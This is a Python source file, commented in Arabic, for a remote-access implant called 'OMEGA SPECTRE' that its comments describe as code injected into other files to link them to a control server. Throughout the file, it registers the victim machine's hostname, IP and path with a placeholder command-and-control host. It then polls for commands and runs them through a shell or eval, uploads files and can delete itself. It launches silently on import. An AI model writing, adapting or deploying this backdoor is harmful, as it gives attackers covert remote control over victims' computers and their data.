# ============================================================
# 🔗 OMEGA SPECTRE LINK - RUNTIME BINDER v∞
# هذا الكود يُحقن في جميع الملفات لربطها بخادم التحكم
# ============================================================

import os
import sys
import json
import time
import socket
import hashlib
import threading
import subprocess
from datetime import datetime

# تثبيت requests إذا لم يكن موجوداً
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
    import requests

class OmegaBinder:
    """
    نظام الربط التلقائي للملفات
    يربط الملف الحالي بخادم التحكم OMEGA SPECTRE
    """
    
    def __init__(self, server="http://YOUR_IP:8080"):
        self.server = server
        self.device_id = self.generate_device_id()
        self.file_path = os.path.abspath(__file__)
        self.file_name = os.path.basename(self.file_path)
        self.running = True
        self.commands_executed = 0
        
    def generate_device_id(self):
        """توليد معرف فريد للجهاز"""
        try:
            import uuid
            return hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:16]
        except:
            return hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
    
    def get_ip(self):
        """الحصول على عنوان IP العام"""
        try:
            import requests
            return requests.get('https://api.ipify.org?format=json', timeout=2).json()['ip']
        except:
            return '0.0.0.0'
    
    def register(self):
        """تسجيل الجهاز في خادم التحكم"""
        try:
            data = {
                'device_id': self.device_id,
                'file': self.file_name,
                'file_path': self.file_path,
                'ip': self.get_ip(),
                'hostname': socket.gethostname(),
                'os': sys.platform,
                'timestamp': datetime.now().isoformat()
            }
            response = requests.post(f"{self.server}/register", json=data, timeout=3)
            return response.status_code == 200
        except:
            return False
    
    def heartbeat_loop(self):
        """إرسال نبضات القلب باستمرار"""
        while self.running:
            try:
                data = {
                    'device_id': self.device_id,
                    'file': self.file_name,
                    'status': 'active',
                    'timestamp': datetime.now().isoformat()
                }
                requests.post(f"{self.server}/heartbeat", json=data, timeout=2)
            except:
                pass
            time.sleep(30)  # كل 30 ثانية
    
    def listen_loop(self):
        """الاستماع للأوامر من الخادم"""
        while self.running:
            try:
                response = requests.get(
                    f"{self.server}/get_command/{self.device_id}",
                    timeout=5
                )
                if response.status_code == 200:
                    command = response.json().get('command')
                    if command:
                        self.execute_command(command)
            except:
                pass
            time.sleep(5)  # كل 5 ثواني
    
    def execute_command(self, command):
        """تنفيذ الأمر المستلم"""
        try:
            self.commands_executed += 1
            
            # محاولة تنفيذ الأمر ككود Python
            if command.startswith('exec '):
                # استدعاء دالة أو ملف
                parts = command[5:].split(' ', 1)
                target = parts[0]
                args = parts[1] if len(parts) > 1 else ''
                
                if target.endswith('.py'):
                    # تنفيذ ملف Python
                    result = subprocess.check_output(
                        [sys.executable, target] + args.split(),
                        text=True,
                        timeout=30
                    )
                else:
                    # تنفيذ كود Python
                    result = eval(command[5:])
                
                self.send_result(result)
            
            elif command == 'status':
                # عرض حالة الملف
                status = {
                    'device_id': self.device_id,
                    'file': self.file_name,
                    'commands_executed': self.commands_executed,
                    'uptime': time.time() - self.start_time
                }
                self.send_result(json.dumps(status, indent=2))
            
            elif command == 'self_destruct':
                # تدمير الملف
                self.self_destruct()
            
            elif command == 'upload':
                # رفع الملف إلى الخادم
                self.upload_file()
            
            else:
                # تنفيذ أمر نظام
                result = subprocess.check_output(command, shell=True, text=True, timeout=30)
                self.send_result(result)
                
        except subprocess.TimeoutExpired:
            self.send_error(f"Command timed out: {command}")
        except Exception as e:
            self.send_error(f"Command failed: {str(e)}")
    
    def send_result(self, result):
        """إرسال نتيجة التنفيذ للخادم"""
        try:
            data = {
                'device_id': self.device_id,
                'file': self.file_name,
                'result': str(result)[:10000],  # الحد الأقصى للطول
                'timestamp': datetime.now().isoformat()
            }
            requests.post(f"{self.server}/result", json=data, timeout=3)
        except:
            pass
    
    def send_error(self, error):
        """إرسال خطأ للخادم"""
        try:
            data = {
                'device_id': self.device_id,
                'file': self.file_name,
                'error': str(error)[:1000],
                'timestamp': datetime.now().isoformat()
            }
            requests.post(f"{self.server}/error", json=data, timeout=3)
        except:
            pass
    
    def self_destruct(self):
        """تدمير الملف (حذف نفسه)"""
        try:
            os.remove(self.file_path)
            self.running = False
            return "Self-destruct successful"
        except:
            return "Self-destruct failed"
    
    def upload_file(self):
        """رفع الملف إلى خادم التحكم"""
        try:
            with open(self.file_path, 'rb') as f:
                files = {'file': f}
                data = {'device_id': self.device_id, 'filename': self.file_name}
                response = requests.post(
                    f"{self.server}/upload",
                    files=files,
                    data=data,
                    timeout=10
                )
            self.send_result(f"File uploaded: {self.file_name}")
        except Exception as e:
            self.send_error(f"Upload failed: {str(e)}")
    
    def start(self):
        """بدء تشغيل نظام الربط"""
        self.start_time = time.time()
        
        print(f"[🔗] OMEGA SPECTRE BINDER - {self.file_name}")
        print(f"[🔗] Device ID: {self.device_id}")
        print(f"[🔗] Server: {self.server}")
        
        # تسجيل الجهاز
        if self.register():
            print("[✅] Device registered")
        else:
            print("[⚠️] Registration failed, retrying...")
        
        # بدء الخيوط
        threading.Thread(target=self.heartbeat_loop, daemon=True).start()
        threading.Thread(target=self.listen_loop, daemon=True).start()
        
        # الحفاظ على التشغيل
        while self.running:
            time.sleep(1)

# ============================================================
# التشغيل التلقائي عند استيراد الملف
# ============================================================

if __name__ != "__main__":
    # عند استيراد الملف، بدء الربط تلقائياً
    _binder = OmegaBinder()
    threading.Thread(target=_binder.start, daemon=True).start()
    
    # تصدير الكلاس للاستخدام الخارجي
    __all__ = ['OmegaBinder']